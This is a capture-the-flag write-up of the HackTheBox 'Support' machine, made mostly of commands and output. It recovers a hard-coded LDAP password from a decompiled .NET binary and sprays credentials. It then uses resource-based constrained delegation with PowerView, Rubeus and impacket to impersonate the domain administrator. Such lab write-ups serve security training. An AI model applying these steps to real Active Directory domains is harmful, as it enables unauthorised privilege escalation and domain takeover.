---
title: HackTheBox-Support
date: 2024-12-23 09:40:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [ldapsearch, add-comptuer]     # TAG names should always be lowercase
---

## SMB-enum
    ➜  Support nxc smb 10.10.11.174 
    SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)

    ➜  Support smbclient -L \\support.htb
    Password for [WORKGROUP\root]:

            Sharename       Type      Comment
            ---------       ----      -------
            ADMIN$          Disk      Remote Admin
            C$              Disk      Default share
            IPC$            IPC       Remote IPC
            NETLOGON        Disk      Logon server share 
            support-tools   Disk      support staff tools
            SYSVOL          Disk      Logon server share 
    Reconnecting with SMB1 for workgroup listing.
    do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
    Unable to connect with SMB1 -- no workgroup available

## Decompile exe file

if its Mono/.Net assembly then go dnspy 


if its not we can check ida or ghidra
for username

    ➜  Support cat ldapuser.txt 
                    public LdapQuery()
                    {
                            string password = Protected.getPassword();
                            this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
                            this.entry.AuthenticationType = AuthenticationTypes.Secure;
                            this.ds = new DirectorySearcher(this.entry);
                    }

for password


    ➜  Support cat getpassword.txt 
    using System;
    using System.Text;

    namespace UserInfo.Services
    {
            // Token: 0x02000006 RID: 6
            internal class Protected
            {
                    // Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
                    public static string getPassword()
                    {
                            byte[] array = Convert.FromBase64String(Protected.enc_password);
                            byte[] array2 = array;
                            for (int i = 0; i < array.Length; i++)
                            {
                                    array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
                            }
                            return Encoding.Default.GetString(array2);
                    }

                    // Token: 0x04000005 RID: 5
                    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

                    // Token: 0x04000006 RID: 6
                    private static byte[] key = Encoding.ASCII.GetBytes("armando");
            }
    }

## crack pass

    ldap : 
    ➜  Support python3 a.py 
    Decrypted password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

    ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

## ldapsearch

    ➜  Support ldapsearch -x -b "dc=support,dc=htb" -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' > ldapresult.txt

lets analyze it

    ➜  Support cat ldapresult.txt | grep "info"       
    y with information about license issuance, for the purpose of tracking and re
    298939 for more information.
    info: Ironside47pleasure40Watchful

## password-spray

    ➜  Support nxc smb support.htb -u users.txt -p 'Ironside47pleasure40Watchful' --continue-on-succes 

    SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful

## GenericAll-GetDomainTGT-addcomputer

### WindowsAbuse
    *Evil-WinRM* PS C:\Users\support\Documents> . .\PowerView.ps1
    *Evil-WinRM* PS C:\Users\support\Documents> . .\Powermad.ps1

#### new-machine-account

    *Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount osman -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose
    Verbose: [+] Domain Controller = dc.support.htb
    Verbose: [+] Domain = support.htb
    Verbose: [+] SAMAccountName = osman$
    Verbose: [+] Distinguished Name = CN=osman,CN=Computers,DC=support,DC=htb
    [+] Machine account osman added
    *Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid = Get-DomainComputer osman -Properties objectsid | Select -Expand objectsid
    *Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid
    S-1-5-21-1677581083-3380853377-188903654-5601
    *Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

    *Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
    *Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
    *Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer dc.support.htb | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
    Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
    Verbose: [Get-DomainObject] Extracted domain 'support.htb' from 'CN=DC,OU=Domain Controllers,DC=support,DC=htb'
    Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
    Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC,OU=Domain Controllers,DC=support,DC=htb)))
    Verbose: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 27 219 253 99 129 186 131 201 230 112 66 11 225 21 0 0' for object 'DC$'

    New-MachineAccount -MachineAccount osman -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose

    $ComputerSid = Get-DomainComputer osman -Properties objectsid | Select -Expand objectsid

    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)

    Get-DomainComputer dc.support.htb | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#### auth as fake computer

##### grab rc4
    .\Rubeus.exe hash /password:Password123! /user:osman /domain:support.htb

    *Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Password123! /user:osman /domain:support.htb

    ______        _
    (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v2.2.0


    [*] Action: Calculate Password Hash(es)

    [*] Input password             : Password123!
    [*] Input username             : osman
    [*] Input domain               : support.htb
    [*] Salt                       : SUPPORT.HTBosman
    [*]       rc4_hmac             : 2B576ACBE6BCFDA7294D6BD18041B8FE
    [*]       aes128_cts_hmac_sha1 : 70382F00AE681A23362CD9915267DCD0
    [*]       aes256_cts_hmac_sha1 : 205DD641B921AB4B9A41B5AD2231B36992119B9FA052F8AEB88A2385806FE65C
    [*]       des_cbc_md5          : 570BD398A2918649

##### s4u


    Rubeus.exe s4u /user:osman$ /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt



    *Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:osman$ /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

    ______        _
    (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v2.2.0

    [*] Action: S4U

    [*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
    [*] Building AS-REQ (w/ preauth) for: 'support.htb\osman$'
    [*] Using domain controller: ::1:88
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

        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


    [*] Action: S4U

    [*] Building S4U2self request for: 'osman$@SUPPORT.HTB'
    [*] Using domain controller: dc.support.htb (::1)
    [*] Sending S4U2self request to ::1:88
    [+] S4U2self success!
    [*] Got a TGS for 'administrator' to 'osman$@SUPPORT.HTB'
    [*] base64(ticket.kirbi):

        doIFoDCCBZygAwIBBaEDAgEWooIEwDCCBLxhggS4MIIEtKADAgEFoQ0bC1NVUFBPUlQuSFRCohMwEaAD
        AgEBoQowCBsGb3NtYW4ko4IEhzCCBIOgAwIBF6EDAgEBooIEdQSCBHFwaXoj3/GZmQ2NgjP9PWC3G3eO
        gW5SoyeEagiJziSqNgXiXAQcH+Hi/NpVX1avQdzfrc17PeJYxJYxmIB0pG5yERGF0B5JYJWiRfMA573u
        YHLDOs1mS3PKosBWJ1A1PEcJ7+tXFDkPC3L3Q5UzWyxY6Uz4WGeEcEx7I+oc+7Y1DGOu6mZj58aL0xng
        TYn7UANNuDz5yOc+VyKHpwHrlrFFr4zFk2WBANSF3vTeA5zwjIvwoofTQVJwR0CEqIRiZjkrHkqkU4da
        B6m+E8IiwRNeNy/9FPZjwVd/3r1Dy1287WsAjffdvlhkm+xPA8d3uDan+1Ty9ghseFDaU42M2qxtxdfN
        yP6R02v1MSd6l/8+WKtI9Um14RxP+nhvLWsnMFZt9854Zor110UJaBOrOqtnfjRt4R9wz8XxcUuEb1RF
        WeGrd4d7Ohlw8uPQHpO+mTNpnfuPmojAE1/kjF5RwN/peXwD8fXGtK8U5Ts6V30IIwAy9JvktYPhXke+
        /5IEKsHl0zXYq+KbWMh+uo+1wZO2tcggmT4g4ntcvdkdVlF6xwRrjoJFjbbZMTjn+ZVCM23mQ6CQ5t3U
        3MLF4T0M1/e5lW55/nw9w1WCe/00sj4k3pBKcHJNaxCEoi0U8egVbTJHvyOluf9hX6iMfIUiHWx5VppH
        WUzG+LdulloGTN7iezyb2Cy+ZmqpoLhFs8O53isXcF/5APTXkTq2n5ItM33D37nONmhmhbOF2btzcxN0
        NL6PBgKIb5fZj/TKgOLwlOpkUyOeCaLqpGM/Oq/QpEtSf152+BH/bVwB/v/RZnNzTGEwDf3bQqPbONBp
        wkGWABCIN8mF+Go3SHByQF5YtmUYg7V0STIL0Djme2lj8TAq99zhLnjs1P9PSrhhhWamoK/fBqqURX3Y
        QjkAoEI8KRvStvhFy0WwhDXsJJDd9xb2L/rDJ1iV3IkM3I3YUYMcFUbj4WOqjMG2ar9PmL0Q2koGLPfw
        walwGGA01Nl53irq2fd+7/awGiHHjozqSdx3mXjE88/o0d8xd3G79I2SSAeRcKRPASlgAPypGqiNSNpd
        ocburKtP5BYoazaRNQzQ4EwecmdJ1qXgHyPp27eHW9aUveLX4b0oXW54Iuz2WhqLNBc1PnizhDqj85Wy
        ulIj2qmsZn96UvXi0Nr+3UawpYQ/I9+/wPkufxV8gkkWtiBkH5rQReJQwy4bGCLVV7JVo84rcQ6VJ092
        Q8MvxXPy0b26DAuNw3qABldLWqQKbM6SZjGWyuOsYUDCbigC2SS2mv6dlEaFy0hFeUe009w6FsjYyc24
        Gf6j1DqCgqvajiUemy6+DLTR9LvFI1MuLgqVK6IhB4znlmoLKN0bOydH8XxB38WfbfDmrtXxJrYcIKnK
        mqncjQpm0k/93pRFQ7PcYySwJdG/XXby/u9yqOX5R8Ayh+tGDv1AD42Bi5MsqdJkUVuegUyiW5Vkdmhx
        a2bud5a2iuUZPxhMBBJ9HH3DqmUcH3sPLEQhyY92SA7y8CR3nWejgcswgcigAwIBAKKBwASBvX2BujCB
        t6CBtDCBsTCBrqAbMBmgAwIBF6ESBBCHwbLNEOlQidEQxRFfa3imoQ0bC1NVUFBPUlQuSFRCohowGKAD
        AgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI0MTIyMDEzMDExOVqmERgPMjAyNDEy
        MjAyMzAxMThapxEYDzIwMjQxMjI3MTMwMTE4WqgNGwtTVVBQT1JULkhUQqkTMBGgAwIBAaEKMAgbBm9z
        bWFuJA==

    [*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
    [*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
    [*] Using domain controller: dc.support.htb (::1)
    [*] Sending S4U2proxy request to domain controller ::1:88
    [+] S4U2proxy success!
    [*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

        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
        Gw5kYy5zdXBwb3J0Lmh0Yg==
    [+] Ticket successfully imported!

verify attack

    *Evil-WinRM* PS C:\Users\support\Documents> klist

    Current LogonId is 0:0xe0f55

    Cached Tickets: (1)

    #0>     Client: administrator @ SUPPORT.HTB
            Server: cifs/dc.support.htb @ SUPPORT.HTB
            KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
            Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
            Start Time: 12/20/2024 5:01:19 (local)
            End Time:   12/20/2024 15:01:18 (local)
            Renew Time: 12/27/2024 5:01:18 (local)
            Session Key Type: AES-128-CTS-HMAC-SHA1-96
            Cache Flags: 0
            Kdc Called:
    *Evil-WinRM* PS C:\Users\support\Documents> 

### Linux-Abuse

#### addcomputer

    ➜  Support impacket-addcomputer -computer-name 'irem$' -computer-pass Password321! -dc-ip 10.10.11.174 support/support:Ironside47pleasure40Watchful
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [!] No DC host set and 'support' doesn't look like a FQDN. DNS resolution of short names will probably fail.
    [*] Successfully added machine account irem$ with password Password321!.

#### RBCD

    ➜  Support impacket-rbcd -action write -delegate-to "dc$" -delegate-from 'irem$' -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Accounts allowed to act on behalf of other identity:
    [*]     osman$       (S-1-5-21-1677581083-3380853377-188903654-5601)
    [*] Delegation rights modified successfully!
    [*] irem$ can now impersonate users on dc$ via S4U2Proxy
    [*] Accounts allowed to act on behalf of other identity:
    [*]     osman$       (S-1-5-21-1677581083-3380853377-188903654-5601)
    [*]     irem$        (S-1-5-21-1677581083-3380853377-188903654-5602)

#### getST

    ➜  Support impacket-getST support.htb/irem$:Password321! -spn www/dc.support.htb -impersonate administrator
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [-] CCache file is not found. Skipping...
    [*] Getting TGT for user
    [*] Impersonating administrator
    /usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow()
    /usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    [*] Requesting S4U2self
    /usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow()
    /usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    [*] Requesting S4U2Proxy
    [*] Saving ticket in administrator@www_dc.support.htb@SUPPORT.HTB.ccache

Video walkthrough
[WATCH!](https://youtu.be/6Nh8s8DwWXk)